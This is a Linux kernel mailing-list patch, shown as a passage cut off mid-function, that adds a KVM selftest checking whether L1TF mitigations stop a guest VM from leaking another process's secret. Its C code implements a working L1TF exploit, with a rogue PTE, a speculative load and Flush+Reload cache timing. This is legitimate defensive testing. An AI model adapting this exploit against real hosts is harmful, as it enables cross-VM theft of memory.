Return-Path: <linux-kselftest+bounces-42998-lists+linux-kselftest=lfdr.de@vger.kernel.org>
X-Original-To: lists+linux-kselftest@lfdr.de
Delivered-To: lists+linux-kselftest@lfdr.de
Received: from dfw.mirrors.kernel.org (dfw.mirrors.kernel.org [IPv6:2605:f480:58:1:0:1994:3:14])
	by mail.lfdr.de (Postfix) with ESMTPS id C5EA2BD4B88
	for <lists+linux-kselftest@lfdr.de>; Mon, 13 Oct 2025 18:04:22 +0200 (CEST)
Received: from smtp.subspace.kernel.org (relay.kernel.org [52.25.139.140])
	(using TLSv1.2 with cipher ECDHE-ECDSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by dfw.mirrors.kernel.org (Postfix) with ESMTPS id A8242504074
	for <lists+linux-kselftest@lfdr.de>; Mon, 13 Oct 2025 15:26:41 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 2CD6230DED0;
	Mon, 13 Oct 2025 15:14:14 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=google.com header.i=@google.com header.b="d09gxojR"
X-Original-To: linux-kselftest@vger.kernel.org
Received: from mail-wm1-f73.google.com (mail-wm1-f73.google.com [209.85.128.73])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id D922530DD10
	for <linux-kselftest@vger.kernel.org>; Mon, 13 Oct 2025 15:14:09 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.128.73
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1760368454; cv=none; b=ko8ZuoNRDR7KoREn1Gv0PLq3vaRHAixY+tQv0Sgoa/5/z4O2xWrkRLF15KXJWVKnEpPylbr1zZ4Zvmk89d569S9nPOEfnzzc9VO0cgxJ09yNRah77ckjG7rMMy/cexgg2ztEhVKLwLsUra/WID+mFUR68pALRME9CKt9SFHVxFE=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1760368454; c=relaxed/simple;
	bh=jVgGL/HlDvY1OPaJWiC7yhqhm/1+1YgDDTI35SmubQA=;
	h=Date:In-Reply-To:Mime-Version:References:Message-ID:Subject:From:
	 To:Cc:Content-Type; b=sbpOMTTXKpbM+4ouSlnkvwvJ2g+N5qVsxaueqC8a/JjTY7JcTk9jBnMm9GGSUQJpXLOWHiy5ZQP/Pp92elYOqOmKzYvBC0Taq1p0goc91oodT4owPpSOBThd4+2oSLfK4xxhnTZvQoo0wT2pChu7YvBjk8w4U9P0qPSocgSF/2A=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=google.com; spf=pass smtp.mailfrom=flex--jackmanb.bounces.google.com; dkim=pass (2048-bit key) header.d=google.com header.i=@google.com header.b=d09gxojR; arc=none smtp.client-ip=209.85.128.73
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=google.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=flex--jackmanb.bounces.google.com
Received: by mail-wm1-f73.google.com with SMTP id 5b1f17b1804b1-46e41c32209so23492525e9.0
        for <linux-kselftest@vger.kernel.org>; Mon, 13 Oct 2025 08:14:09 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=google.com; s=20230601; t=1760368448; x=1760973248; darn=vger.kernel.org;
        h=cc:to:from:subject:message-id:references:mime-version:in-reply-to
         :date:from:to:cc:subject:date:message-id:reply-to;
        bh=hpkS+0W6+yEuOdwUpIFsWrV9JpBa9Kmg9a/xSag8GV8=;
        b=d09gxojRWHggRrhJXq1QIClwH4Osa+Od5zeXZ3VZrVcY511tfvceIfYOcrcWaCvZRG
         2v7TpcgfeES/A2zP8BF1QE4auObNU7hd+zM6yCKpTf6TXRG9SL0X9EcysOY0RUNYwLWe
         c0qDCw7chah+HrImS7twEgTi/EGhwD46h/VSgljZY/dqzXtPvRJdBwWUDyEv8fcF058p
         PPrBaJGlAswloP6DrBbie9q4DZex91o+av/tFl70njfmrb5Gdu3hFAVNPcSD4+HJgzEj
         nTLr5Ci3orhzUeN5ft4/9ttW4oelWjEVXgVfbIY/s3m5ikeM+1iBXFBt4xI8BogKGG00
         CoTg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1760368448; x=1760973248;
        h=cc:to:from:subject:message-id:references:mime-version:in-reply-to
         :date:x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
        bh=hpkS+0W6+yEuOdwUpIFsWrV9JpBa9Kmg9a/xSag8GV8=;
        b=f4Y+nCvXOUCGDANqyLwhdSkY+bKH4JUKP4lC+ACALsA7b7whba6woU5EAfLb2ltamh
         +G2ynF8r+IgR75Mu6b9OkrMmYD5iLqqh3zYLGiITufyTlHpuYEwlCebEJ18+s+Ng8VY+
         6wJkpHuDJlpdwCK1ha0WNRDavkoVE/kcSKaaJVk+3H6DxCgcssF0JaxgTXt0Tt2LobLQ
         eDkpHHCKaZxf60X2+scEVNMoHqc7JvYy3yWpvTOo1ne4ETA/1+mEz6jqVRSIkjqWJ8Qk
         pjKCvyGBX0/rqwtcRI5i94gL/PFKdF/po1A5v7j9+IP2QOE2QFqcsZvRsGLZRinyHLs4
         OkKQ==
X-Forwarded-Encrypted: i=1; AJvYcCWz3eJy61XWYLLxOuioLgjn6lEhJhZ++WuKnpI2e1wUSyRA1DFXc3r3DjhKaspUHIJmpjrg2jlYYJVnm0IYT0A=@vger.kernel.org
X-Gm-Message-State: AOJu0YywA+0ooFHyB7mO3k3/2Xmdpznzia8HqIX7caZjKiQ9ut+/bx9U
	05WsdOv3Bu3yh/SLnSSm4DfiX89hUwMmRzr5cEvbhE/alqjHRGXxq6Gsc8EA9HulMdFtP8309V2
	jxd4D5Nb1MDJT5g==
X-Google-Smtp-Source: AGHT+IHzWhwIwMeewh+Pw0pl9YXRi50v536fIoJEGKTFpEPJcRyQ7nPv2zYL9tUN5UotLoEYa0E/7lcCxO3KIQ==
X-Received: from wmcn14.prod.google.com ([2002:a05:600c:c0ce:b0:46e:2897:9c17])
 (user=jackmanb job=prod-delivery.src-stubby-dispatcher) by
 2002:a05:600c:530e:b0:46e:4c90:81d0 with SMTP id 5b1f17b1804b1-46fa9a8f1c5mr148226385e9.2.1760368448218;
 Mon, 13 Oct 2025 08:14:08 -0700 (PDT)
Date: Mon, 13 Oct 2025 15:13:55 +0000
In-Reply-To: <20251013-l1tf-test-v1-0-583fb664836d@google.com>
Precedence: bulk
X-Mailing-List: linux-kselftest@vger.kernel.org
List-Id: <linux-kselftest.vger.kernel.org>
List-Subscribe: <mailto:linux-kselftest+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-kselftest+unsubscribe@vger.kernel.org>
Mime-Version: 1.0
References: <20251013-l1tf-test-v1-0-583fb664836d@google.com>
X-Mailer: b4 0.14.2
Message-ID: <20251013-l1tf-test-v1-2-583fb664836d@google.com>
Subject: [PATCH 2/2] KVM: x86: selftests: add an L1TF exploit test
From: Brendan Jackman <jackmanb@google.com>
To: Shuah Khan <shuah@kernel.org>, Paolo Bonzini <pbonzini@redhat.com>, 
	Sean Christopherson <seanjc@google.com>
Cc: Alexandra Sandulescu <aesa@google.com>, Thomas Gleixner <tglx@linutronix.de>, Ingo Molnar <mingo@redhat.com>, 
	Borislav Petkov <bp@alien8.de>, Dave Hansen <dave.hansen@linux.intel.com>, x86@kernel.org, 
	linux-kselftest@vger.kernel.org, linux-kernel@vger.kernel.org, 
	kvm@vger.kernel.org, Brendan Jackman <jackmanb@google.com>
Content-Type: text/plain; charset="utf-8"

From: Alexandra Sandulescu <aesa@google.com>

Add a test for basic smoke-checking that L1TF mitigations are doing what
they should.

The test sets up the environment for an L1TF exploit executed by a
virtual machine. The exploit reads data that belongs to a different
process (running on a different physical CPU) at a known physical
address.

The test succeeds if it cannot read the victim data correctly, thus
suggesting that an L1TF exploit for this threat model is infeasible. The
test fails if it correctly reads the victim data as a result of the L1TF
exploit.

The test requirements are: the machine is vulnerable to L1TF and the
helper kernel module is loaded prior to the test execution.
The test should pass when the kernel enables asi (asi=on). Environments
where the module can't be loaded (including machines without kprobes
support) will SKIP the test.

Signed-off-by: Alexandra Sandulescu <aesa@google.com>
Co-developed-by: Brendan Jackman <jackmanb@google.com>
Signed-off-by: Brendan Jackman <jackmanb@google.com>
---
 tools/testing/selftests/kvm/Makefile.kvm           |   7 +
 tools/testing/selftests/kvm/x86/l1tf_test.c        | 633 +++++++++++++++++++++
 tools/testing/selftests/kvm/x86/l1tf_test.sh       |  10 +
 .../selftests/kvm/x86/test_modules/Makefile        |  10 +
 .../kvm/x86/test_modules/l1tf_test_helper.c        |  92 +++
 5 files changed, 752 insertions(+)

diff --git a/tools/testing/selftests/kvm/Makefile.kvm b/tools/testing/selftests/kvm/Makefile.kvm
index 148d427ff24befa7e144d9214feb3e34018b7d10..51244b41423ea0dcd9841ac4a1cb4141792c007b 100644
--- a/tools/testing/selftests/kvm/Makefile.kvm
+++ b/tools/testing/selftests/kvm/Makefile.kvm
@@ -54,6 +54,7 @@ LIBKVM_loongarch += lib/loongarch/exception.S
 
 # Non-compiled test targets
 TEST_PROGS_x86 += x86/nx_huge_pages_test.sh
+TEST_PROGS_x86 += x86/l1tf_test.sh
 
 # Compiled test targets valid on all architectures with libkvm support
 TEST_GEN_PROGS_COMMON = demand_paging_test
@@ -152,6 +153,7 @@ TEST_GEN_PROGS_x86 += pre_fault_memory_test
 
 # Compiled outputs used by test targets
 TEST_GEN_PROGS_EXTENDED_x86 += x86/nx_huge_pages_test
+TEST_GEN_PROGS_EXTENDED_x86 += x86/l1tf_test
 
 TEST_GEN_PROGS_arm64 = $(TEST_GEN_PROGS_COMMON)
 TEST_GEN_PROGS_arm64 += arm64/aarch32_id_regs
@@ -223,12 +225,17 @@ TEST_GEN_PROGS_loongarch += memslot_modification_stress_test
 TEST_GEN_PROGS_loongarch += memslot_perf_test
 TEST_GEN_PROGS_loongarch += set_memory_region_test
 
+TEST_GEN_MODS_DIR_x86 = x86/test_modules/
+
 SPLIT_TESTS += arch_timer
 SPLIT_TESTS += get-reg-list
 
 TEST_PROGS += $(TEST_PROGS_$(ARCH))
 TEST_GEN_PROGS += $(TEST_GEN_PROGS_$(ARCH))
 TEST_GEN_PROGS_EXTENDED += $(TEST_GEN_PROGS_EXTENDED_$(ARCH))
+ifneq ($(TEST_GEN_MODS_DIR_$(ARCH)),)
+	TEST_GEN_MODS_DIR = $(TEST_GEN_MODS_DIR_$(ARCH))
+endif
 LIBKVM += $(LIBKVM_$(ARCH))
 
 OVERRIDE_TARGETS = 1
diff --git a/tools/testing/selftests/kvm/x86/l1tf_test.c b/tools/testing/selftests/kvm/x86/l1tf_test.c
new file mode 100644
index 0000000000000000000000000000000000000000..bce761392fcaaa83ced2dc08190e35b9dc3147de
--- /dev/null
+++ b/tools/testing/selftests/kvm/x86/l1tf_test.c
@@ -0,0 +1,633 @@
+// SPDX-License-Identifier: GPL-2.0-only
+/*
+ * l1tf_test.c: Test if a virtual machine can exploit L1TF.
+ * The test succeeds if the exfiltrated data doesn't match a fixed secret. The
+ * test fails if at least two (2) secret bytes are correctly determined using
+ * the L1TF exploit.
+ *
+ * The test spawns a child process on a non-sibling logical core.
+ * For convenience, the test does the following:
+ * 1. The test knows the physical address of the child secret.
+ * The child secret is located in GFP_USER memory.
+ * 2. The test uses a kernel module that on the hypercall path loads an
+ * arbitrary physical address through physmap. This increases the chances that
+ * the secret is present in L1D when the attacker VM triggers the fault.
+ * 3. The test sets the rogue PTE before VM execution.
+ * 4. Finally, the test reads the child secret encoded in the cache via a
+ * shared memory region mapped in the virtual machine and in the vmm.
+ *
+ * The virtual machine exection triggers the hypercall path that loads the
+ * secret in L1D, followed by the execution of the fault instruction that
+ * speculatively loads the secret from L1D as a result of L1TF.
+ * To assert that it leaked the correct secret, the virtual machine encodes the
+ * secret bytes in the cache and transmits them to the vmm process.
+ *
+ * Note. In a real attack, the full exploit executes inside the virtual
+ * machine. This test verifies that the L1TF root cause (the CPU can
+ * fetch from L1D using guest-controlled physical addresses) is mitigated, thus
+ * the other attack phases can be simplified.
+ */
+
+#define _GNU_SOURCE
+#include "test_util.h"
+#include "kvm_util.h"
+#include "processor.h"
+#include <sched.h>
+#include <complex.h>
+#include <linux/limits.h>
+#include <signal.h>
+#include <fcntl.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <string.h>
+#include <err.h>
+#include <sys/mman.h>
+#include <sys/user.h>
+#include <sys/stat.h>
+#include <unistd.h>
+#include <sys/sysinfo.h>
+
+struct kvm_regs regs_init;
+
+#define BYTE_MASK ((1UL << 8) - 1)
+#define xstr(s) str(s)
+#define str(s) #s
+
+#define KVM_HC_SELFTESTS_KVM_L1TF_TEST 0x42
+
+__aligned(PAGE_SIZE) void guest_code(void)
+{
+	asm volatile(
+		/*
+		 * See lib/security/l1tf_test_helper.c for the hypercall
+		 * implementation.
+		 * The hypercall loads the secret in L1D, which is a
+		 * requirement for exploiting L1TF. If the secret is not in L1
+		 * by the time the fault executes, the exploit fails.
+		 * This method is not guaranteed to work (e.g. high cache
+		 * activity could evict the secret in the meantine) but has
+		 * high success rate.
+		 * rax = KVM_HC_SELFTESTS_KVM_L1TF_TEST, rbx = pfn,
+		 * rcx = offset, rdx = loop
+		 */
+		"vmcall\n\t"
+		/* Bring the probe page translation in the TLB */
+		"add %%r8, %%rdi\n\t"
+		/*
+		 * clflush side effect: It requires the physical address for
+		 * cache actions, so the translation is cached in the TLB in
+		 * case of TLB miss.
+		 */
+		"clflush (%%rdi)\n\t"
+		"xor %%rdi, %%rdi\n\t"
+		"mov %%r9, %%rdx\n\t"
+		/* Make sure the above instructions are retired.*/
+		"mfence\n\t"
+		/*
+		 * Speculation window optimization: The faulting instruction
+		 * and the cache encoding instructions are on the same cache
+		 * line.
+		 */
+		".align 0x40\n\t"
+		"movb (%%rdx), %%sil\n\t" /* faulting instruction */
+#ifdef DEBUG
+	/* Uncomment one of the lines below for negative testing */
+	/* "lfence\n\t" // barrier */
+	/* "movq $0xff, %%rsi\n\t" // secret overwrite */
+#endif
+		/*
+		 * The instructions after the fault only execute speculatively.
+		 * Architecturally, the faulting instruction causes an
+		 * exception. The execution is then resumed at guest_pf_handler.
+		 */
+		"shl $9, %%rsi\n\t"
+		"add %%r8, %%rsi\n\t"
+		/*
+		 * Access probe page + sil x offset (PROBE_ARRAY_ENTRY_SIZE).
+		 * The cached address depends on the secret value in sil. The
+		 * value is then read by timing accesses of the probe area.
+		 */
+		"movq (%%rsi), %%rdx\n\t"
+		/* Done. Speculation can stop now. */
+		"lfence\n\t"
+		/* unreachable */
+		"int $0x3\n\t" ::
+			:);
+
+	/* The rest of the code should be far from the exploit code. */
+	asm volatile(".align " xstr(PAGE_SIZE));
+}
+
+#define LEGACY_REBOOT_PORT 0xcf9
+
+static void guest_pf_handler(struct ex_regs *regs)
+{
+	/*
+	 * Can't use GUEST_DONE() because the test requires more vcpu runs that
+	 * ucall objects available (1024). One ucall object is allocated per
+	 * vcpu execution but never freed.
+	 * Don't use UCALL_PIO_PORT because common code calls get_ucall().
+	 */
+	asm volatile("outb %%al, %w[port]"
+		     :
+		     : "a"(0), [port] "d"(LEGACY_REBOOT_PORT)
+		     :);
+}
+
+#define SHMEM_REGION_GVA 0xd0000000ULL
+#define SHMEM_REGION_GPA 0xd0000000ULL
+#define SHMEM_REGION_SLOT 10
+#define SHMEM_ADDR (SHMEM_REGION_GPA)
+#define SHMEM_VADDR (SHMEM_REGION_GVA)
+
+/*
+ * The probe array is a contiguous memory area used to send/recv side channel
+ * signal. The signal corresponds to one out of 256 possible byte values
+ * (0x00-0xff).
+ * The signal is transmitted by loading a single cache line (corresponding to
+ * one byte value) in L1D and it is received by timing the access of that cache
+ * line.
+ * Distance (PROBE_ARRAY_ENTRY_SIZE) is required between the probe entries -
+ * cache lines corresponding to each byte value - so that the prefetcher won't
+ * affect the signal i.e. loading of adjacent data does not land on a valid
+ * probe entry.
+ */
+#define NBYTE_VALUES (1 << BITS_PER_BYTE)
+#define PROBE_ARRAY_SIZE NBYTE_VALUES
+#define PROBE_ARRAY_ENTRY_SIZE 512
+
+#define L1_HIT_THRESHOLD_CPU_CYCLES 100
+#define ROGUE_PTE_GVA (1UL << 30)
+
+int prep_and_run_vcpu(struct kvm_vm *vm, struct kvm_vcpu *vcpu,
+		      uint64_t child_pfn, uint64_t secret_offset,
+		      uint64_t probe_array, size_t probe_page_index)
+{
+	unsigned long duration[PROBE_ARRAY_SIZE];
+	uint64_t ptr, d;
+	size_t mix_i;
+	struct kvm_regs regs;
+	size_t low, high;
+	int secret = -1;
+
+	memset((uint8_t *)duration, 0xff, sizeof(duration));
+
+	vcpu_regs_get(vcpu, &regs);
+	regs.rflags = regs_init.rflags;
+	regs.rip = regs_init.rip;
+	regs.rsp = regs_init.rsp;
+	/* vmcall args. */
+	regs.rax = KVM_HC_SELFTESTS_KVM_L1TF_TEST;
+	regs.rbx = child_pfn << PAGE_SHIFT;
+	regs.rcx = secret_offset;
+	/* Number of times to execute the secret load in the helper module. */
+	regs.rdx = 10000;
+	/* Fault speculation args. */
+	regs.r8 = SHMEM_REGION_GVA;
+	regs.r9 = ROGUE_PTE_GVA | (secret_offset & (~PAGE_MASK));
+	/* Probe array page that we flush before faulting. */
+	regs.rdi = probe_page_index * PAGE_SIZE;
+	vcpu_regs_set(vcpu, &regs);
+
+	/*
+	 * Execute Flush+Reload. This is a generic method to architecturally
+	 * read data leaked by speculative execution. The code below - Flush,
+	 * vcpu_run(), Reload - mush not be reordered or changed i.e. test
+	 * related checks must execute after the fact.
+	 */
+
+	/* Flush. */
+	for (int i = 0; i < PROBE_ARRAY_SIZE; ++i) {
+		ptr = probe_array + i * PROBE_ARRAY_ENTRY_SIZE;
+		asm volatile("clflush (%%rax);" ::"a"(ptr) : "memory");
+	}
+	asm volatile("lfence" :::);
+
+	vcpu_run(vcpu);
+
+	/* Reload. */
+	for (int i = PROBE_ARRAY_SIZE - 1; i >= 0; --i) {
+		/* Shuffle the probe array access to avoid prefetching. */
+		mix_i = ((i * 167) + 13) & 255;
+		ptr = probe_array + mix_i * PROBE_ARRAY_ENTRY_SIZE;
+		asm volatile("lfence; rdtscp\n\t"
+			     "shl $32, %%rdx; or %%rdx, %%rax\n\t"
+			     "mov %%rax, %%r8\n\t"
+			     "mov (%%rdi), %%rdi\n\t"
+			     "lfence; rdtscp\n\t"
+			     "shl $32, %%rdx; or %%rdx, %%rax\n\t"
+			     "sub %%r8, %%rax\n\t"
+			     "lfence\n\t"
+			     "mov %%rax, %0\n\t"
+			     : "=rm"(d)
+			     : "D"(ptr)
+			     : "rax", "rdx", "rcx", "r8", "memory");
+		duration[mix_i] = d;
+	}
+
+#ifdef DEBUG
+	vcpu_dump(stdout, vcpu, 0);
+#endif
+
+	TEST_ASSERT(vcpu->run->exit_reason == KVM_EXIT_IO &&
+			    vcpu->run->io.port == LEGACY_REBOOT_PORT,
+		    "Unexpected exit: %s\n",
+		    exit_reason_str(vcpu->run->exit_reason));
+
+	/*
+	 * Method to discard F+R noise produced by TLB misses on the probe
+	 * pages.
+	 * Samples lower than probe_page_index * PAGE_SIZE are invalid.
+	 * Samples higher than probe_page_index * PAGE_SIZE + PAGE_SIZE are
+	 * invalid.
+	 * Don't break because "0" is often a false positive.
+	 */
+	low = probe_page_index * PAGE_SIZE / PROBE_ARRAY_ENTRY_SIZE;
+	high = low + (PAGE_SIZE / PROBE_ARRAY_ENTRY_SIZE);
+	TEST_ASSERT((high - 1) < PROBE_ARRAY_SIZE, "Invalid F+R offset");
+
+	for (size_t i = low; i < high; ++i) {
+		if (duration[i] < L1_HIT_THRESHOLD_CPU_CYCLES)
+			secret = i;
+	}
+	return secret;
+}
+
+uint8_t get_max(size_t *v, size_t len)
+{
+	size_t maxv = v[0];
+	size_t pos = 0;
+	int i;
+
+	for (i = 1; i < len; ++i) {
+		if (v[i] > maxv) {
+			maxv = v[i];
+			pos = i;
+		}
+	}
+	return pos;
+}
+
+/* Run the "malicious" VM, having it leak a single byte of the victim secret. */
+uint8_t read_byte_vm(struct kvm_vm *vm, struct kvm_vcpu *vcpu,
+		     uint64_t child_pfn, uint64_t secret_offset,
+		     uint64_t probe_array)
+{
+	size_t nprobe_pages, secret_samples[NBYTE_VALUES];
+	uint64_t nruns = 60;
+	int i, j, secret;
+
+	nprobe_pages = PROBE_ARRAY_SIZE * PROBE_ARRAY_ENTRY_SIZE / PAGE_SIZE;
+	memset(secret_samples, 0, sizeof(secret_samples));
+	for (i = 0; i < nruns; ++i) {
+		/*
+		 * Need to run the exploit multiple times so that the probe
+		 * page that the secret byte lands on has a TLB entry.
+		 * The probe array has
+		 * PROBE_ARRAY_SIZE x PROBE_ARRAY_ENTRY_SIZE / PAGE_SIZE = 32
+		 * pages. The guest code flushes one probe page, which at uarch
+		 * level, accesses the page and caches the translation in
+		 * the TLB.
+		 */
+		for (j = 0; j < nprobe_pages; ++j) {
+			secret = prep_and_run_vcpu(vm, vcpu, child_pfn,
+						   secret_offset, probe_array,
+						   j);
+			TEST_ASSERT(secret < NBYTE_VALUES,
+				    "Invalid secret value: 0x%x", secret);
+			if (secret >= 0)
+				secret_samples[secret] += 1;
+		}
+	}
+
+	return get_max(secret_samples, NBYTE_VALUES);
+}
+
+void set_pte_l1tf(struct kvm_vm *vm, struct kvm_vcpu *vcpu, uint64_t va,
+		  uint64_t pa)
+{
+	uint64_t *pte = vm_get_page_table_entry(vm, va);
+
+	/*
+	 * According to Intel, a fault delivered to a PTE with Present bit = 0
+	 * is a terminal fault because the condition causes the address
+	 * translation to terminate immediately.
+	 * During the terminal fault, the processor _speculatively_ computes an
+	 * address based the on the PTE and the address of the fault and uses
+	 * this address in the following instructions.
+	 */
+	*pte = (pa & PAGE_MASK);
+}
+
+void set_pte_bits(struct kvm_vm *vm, struct kvm_vcpu *vcpu, uint64_t vaddr,
+		  uint64_t bits)
+{
+	uint64_t *pte = vm_get_page_table_entry(vm, vaddr);
+
+	bits = bits & (~PAGE_MASK);
+	*pte |= bits;
+}
+
+#define PAGEMAP_PFN_MASK ((1UL << 55) - 1)
+uint64_t get_pagemap(uint64_t va)
+{
+	uint64_t pfn, offset;
+	char path[] = "/proc/self/pagemap";
+	int fd;
+
+	fd = open(path, O_RDONLY);
+	TEST_ASSERT(fd > 0, "Failed to open() %s", path);
+
+	va = va >> PAGE_SHIFT;
+	offset = va * sizeof(uint64_t);
+	TEST_ASSERT(lseek(fd, offset, SEEK_SET) >= 0, "lseek() failed");
+
+	TEST_ASSERT(read(fd, (void *)&pfn, sizeof(uint64_t)) == sizeof(pfn),
+		    "read() failed");
+
+	close(fd);
+
+	return (pfn & PAGEMAP_PFN_MASK) << PAGE_SHIFT;
+}
+
+#define SECRET_VALUE 0x11223344aabbccddUL
+
+/*
+ * This is the code for the simulated victim, i.e. a userspace process owning
+ * some piece of secret data that will end up in L1D and be stolen by the
+ * exploit.
+ */
+void child_process(char *path)
+{
+	int i, fd;
+	uint64_t pa;
+	uint64_t *secret_page;
+
+	secret_page = (uint64_t *)mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
+				       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+	TEST_ASSERT((void *)secret_page != MAP_FAILED, "mmap() failed");
+
+	for (i = 0; i < PAGE_SIZE / sizeof(*secret_page); ++i)
+		secret_page[i] = SECRET_VALUE;
+
+	pa = get_pagemap((uint64_t)secret_page);
+
+	fd = open(path, O_WRONLY);
+	TEST_ASSERT(fd > 0, "Failed to open %s", path);
+
+	TEST_ASSERT(write(fd, &pa, sizeof(pa)) > 0, "write() failed");
+	close(fd);
+
+	while (true)
+		sleep(1);
+}
+
+/*
+ * The child process finds the PFN corresponding to the secret page and writes
+ * it in a file shared between the test process and child process.
+ * In a real scenario, the attacker is unlikely to know the physical address.
+ */
+uint64_t get_child_secret_pa(char *path)
+{
+	uint64_t pa;
+	int fd, n;
+
+	fd = open(path, O_RDONLY);
+	TEST_ASSERT(fd > 0, "Failed to open %s", path);
+
+	n = read(fd, &pa, sizeof(pa));
+	TEST_ASSERT(n > 0, "Failed to read PA from child process");
+	close(fd);
+	return pa;
+}
+
+int physical_address_bits(void)
+{
+	uint32_t eax, ebx, ecx, edx;
+
+	cpuid(0x80000008, &eax, &ebx, &ecx, &edx);
+	return eax & BYTE_MASK;
+}
+
+#define BUF_SIZE 64
+bool l1tf_present(void)
+{
+	int fd;
+	char buf[BUF_SIZE];
+	char not_affected[] = "Not affected";
+	char path[] = "/sys/devices/system/cpu/vulnerabilities/l1tf";
+
+	fd = open(path, O_RDONLY);
+	TEST_ASSERT(fd > 0, "Failed to open() %s", path);
+	TEST_ASSERT(read(fd, buf, BUF_SIZE) > 0, "read() failed");
+	close(fd);
+	return strncmp(buf, not_affected, sizeof(not_affected) - 1) != 0;
+}
+
+bool kmod_present(void)
+{
+	char proc_modules[] = "/proc/modules";
+	char kmod_name[] = "l1tf_test_helper";
+	bool kmod_found = false;
+	char line[PATH_MAX];
+	FILE *f = NULL;
+
+	f = fopen(proc_modules, "r");
+	TEST_ASSERT(f != NULL, "Failed to fopen() %s", proc_modules);
+
+	while (fgets(line, sizeof(line), f) > 0) {
+		if (strncmp(line, kmod_name, sizeof(kmod_name) - 1) == 0) {
+			kmod_found = true;
+			break;
+		}
+	}
+
+	fclose(f);
+	return kmod_found;
+}
+
+/* Return the CPU number of the core's SMT sibling, or -1 if none exists. */
+int thread_sibling_id(int core)
+{
+	char buf[PATH_MAX];
+	int fd, sibling_id, id;
+
+	sprintf(buf,
+		"/sys/devices/system/cpu/cpu%d/topology/thread_siblings_list",
+		core);
+
+	TEST_ASSERT((fd = open(buf, O_RDONLY)) > 0, "Failed to open() %s", buf);
+	memset(buf, 0, PATH_MAX);
+	TEST_ASSERT(read(fd, buf, PATH_MAX) > 0, "read() failed");
+	close(fd);
+	if (sscanf(buf, "%d,%d", &id, &sibling_id) != 2) {
+		/* Assume SMT disabled. */
+		return -1;
+	}
+	return sibling_id;
+}
+
+void cleanup(int child_pid, struct kvm_vm *vm)
+{
+	kill(child_pid, SIGKILL);
+	kvm_vm_free(vm);
+}
+
+#define PCPU_ID 2
+int main(int argc, char *argv[], char *envp[])
+{
+	uint64_t probe_array, secret_pa, physical_address_mask, leaked_value;
+	size_t secret_size = 8, nprobe_pages, match = 0, mask;
+	char tmp_path[] = "/tmp/tmp.L1TF.test";
+	struct kvm_vcpu *vcpu;
+	long secret_pa_offset;
+	int pid, i, nbits_pa;
+	struct kvm_vm *vm;
+	uint8_t *secret;
+
+	if (argc == 2 && !strncmp(argv[1], tmp_path, sizeof(tmp_path))) {
+		/*
+		 * The test (main process) spawned a child process to execute
+		 * on the hyperthread. The child runs an infinite loop.
+		 */
+		child_process(argv[1]);
+		TEST_ASSERT(false, "Unreachable");
+	}
+
+	TEST_REQUIRE(l1tf_present());
+	TEST_REQUIRE(kmod_present());
+	TEST_REQUIRE(kvm_cpu_has(X86_FEATURE_CLFLUSH));
+	TEST_REQUIRE(get_nprocs() > PCPU_ID);
+
+	pin_self_to_cpu(PCPU_ID);
+
+	mkfifo(tmp_path, 0666);
+
+	pid = fork();
+	TEST_ASSERT(pid >= 0, "fork() failed");
+	if (pid == 0) {
+		char *child_argv[] = { argv[0], tmp_path, NULL };
+		int sibling = thread_sibling_id(PCPU_ID);
+		int child_cpu;
+		/*
+		 * The child process needs to run on a separate physical core.
+		 * Otherwise, the secret is cached in L1D as a result of the
+		 * co-location.
+		 */
+		if (sibling >= 0)
+			child_cpu = sibling + 1;
+		else
+			child_cpu = PCPU_ID + 1;
+		TEST_ASSERT(child_cpu != PCPU_ID && child_cpu < get_nprocs(),
+			    "Invalid child cpu %d", child_cpu);
+
+		pin_self_to_cpu(child_cpu);
+		pr_info("[%d] Child running on core (%d).\n", getpid(),
+			child_cpu);
+
+		TEST_ASSERT(execve(child_argv[0], child_argv, envp) != -1,
+			    "execve() failed");
+	} else if (pid > 0) {
+		/* Parent. */
+		pr_info("[%d] Forked child process (%d). Parent running on core (%d).\n",
+			getpid(), pid, PCPU_ID);
+	}
+
+	secret_pa = get_child_secret_pa(tmp_path);
+	unlink(tmp_path);
+
+	nbits_pa = physical_address_bits();
+	physical_address_mask = (1UL << nbits_pa) - 1;
+	physical_address_mask &= PAGE_MASK;
+
+	TEST_ASSERT(
+		(secret_pa & ~physical_address_mask) == 0,
+		"Physical address check failure: 0x%lx (not aligned or sets bits higher than %d).",
+		secret_pa, nbits_pa);
+
+	vm = vm_create_with_one_vcpu(&vcpu, guest_code);
+
+	/*
+	 * Map the rogue PTE, i.e. the PTE that the "attacker" controls.
+	 * The guest access of ROGUE_PTE_GVA triggers a fault because the
+	 * present bit is not set. As a result, a CPU vulnerable to L1TF uses
+	 * the guest-controlled physical address (secret_pa) to fetch data from
+	 * L1D. The speculation window following the fault is large enough to
+	 * encode the data into a side-channel.
+	 */
+	virt_map(vm, ROGUE_PTE_GVA, secret_pa, 1);
+	set_pte_l1tf(vm, vcpu, ROGUE_PTE_GVA, secret_pa);
+
+	/*
+	 * Flush+Reload (F+R) probe.
+	 * This allocates the required memory area for F+R (prep_and_run_vcpu).
+	 */
+	nprobe_pages = PROBE_ARRAY_SIZE * PROBE_ARRAY_ENTRY_SIZE / PAGE_SIZE;
+
